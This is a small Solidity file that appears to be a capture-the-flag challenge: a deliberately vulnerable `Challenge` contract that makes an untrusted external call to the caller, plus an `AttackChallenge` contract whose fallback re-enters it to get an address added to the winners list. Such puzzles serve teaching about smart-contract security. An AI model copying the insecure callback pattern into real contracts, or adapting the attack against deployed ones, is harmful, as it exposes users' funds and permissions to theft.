// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge {
    address[] public winners;
    bool lock;

    function exploit_me(address winner) public {
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public {
        lock = true;
    }
}

contract AttackChallenge {
    Challenge challenge;
    address public challengeAddress;

    constructor(address _victimAddress) public {
        challenge = Challenge(_victimAddress);
    }

    function attack() public {
        challenge.exploit_me(msg.sender);
    }

    fallback() external {
        challenge.lock_me();
    }
}